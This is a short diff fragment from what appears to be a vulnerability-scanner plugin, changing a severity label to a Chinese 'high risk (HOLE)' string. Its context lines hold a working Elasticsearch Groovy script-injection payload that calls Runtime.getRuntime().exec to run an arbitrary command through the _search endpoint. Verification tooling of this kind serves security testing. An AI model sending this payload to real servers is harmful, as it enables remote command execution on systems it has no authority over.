@@ -49,7 +49,7 @@ class P(T):
             result['result']=True
             result['VerifyInfo'] = {}
             result['VerifyInfo']['type']='Command Execution'
-            result['VerifyInfo']['level'] = 'hole'
+            result['VerifyInfo']['level'] = '高危(HOLE)'
             result['VerifyInfo']['URL'] =ip+":port/_search"
             result['VerifyInfo']['payload'] = '{"size": 1,"script_fields": {"secpulse": {"script":'   \
             ' "java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"COMMAND\\\")","lang": "groovy"}}}'
